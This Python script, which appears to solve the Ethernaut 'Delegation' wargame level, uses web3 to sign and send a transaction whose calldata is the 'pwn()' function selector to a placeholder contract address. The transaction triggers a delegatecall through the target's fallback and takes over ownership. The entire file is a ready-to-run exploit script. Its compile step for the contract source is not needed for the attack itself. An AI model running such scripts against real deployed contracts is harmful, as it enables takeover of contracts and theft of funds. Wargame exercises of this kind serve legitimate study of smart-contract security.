import web3
import solcx
from dotenv import load_dotenv
import os

load_dotenv()

# load variables from .env
wallet_private_key = os.getenv("WALLET_PRIVATE_KEY")
wallet_address = os.getenv("WALLET_ADDRESS")
w3 = web3.Web3(web3.HTTPProvider(os.getenv("WEB3_PROVIDER")))

contract_address = "0xCONTRACTADDRESS"

# function to read contract source code, then return both the abi and bytecode
def read_source_return_abi_bytecode(contract_file, w3):
    with open(contract_file, "r") as f:
        contract_source = f.read()
        f.close()

    # install solc version 0.8.0 in case it's not installed.
    solcx.install_solc("0.8.0")
    solcx.set_solc_version("0.8.0")
    compiled_sol = solcx.compile_source(contract_source)

    # get abi and bytecode from our exploit contract, <stdin> is the placeholder for the file name we chose.
    abi = compiled_sol["<stdin>:Delegation"]["abi"]
    bytecode = compiled_sol["<stdin>:Delegation"]["bin"]

    return (abi, bytecode)

# function to send a transaction and return a receipt
def sign_and_send_transaction(w3, wallet_private_key, tx):
    signed_tx = w3.eth.account.sign_transaction(tx, wallet_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt

def main():
    (delegate_abi, delegate_bytecode) = read_source_return_abi_bytecode("./Delegation.sol", w3)

    delegate_contract = w3.eth.contract(abi=delegate_abi, bytecode=delegate_bytecode)

    # first four bytes of the keccak256 hash of the function signature
    function_name = "pwn()"
    function_signature = w3.keccak(text=function_name)[0:4].hex()

    pwn_tx_fields = {
        "nonce": w3.eth.get_transaction_count(wallet_address, "pending"),
        "gas": 500_000,
        "gasPrice": w3.to_wei("5", "gwei"),
        "to": contract_address,
        "data": function_signature
    }

    pwn_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, pwn_tx_fields)
    print(pwn_tx_receipt)

if __name__ == "__main__":
    main()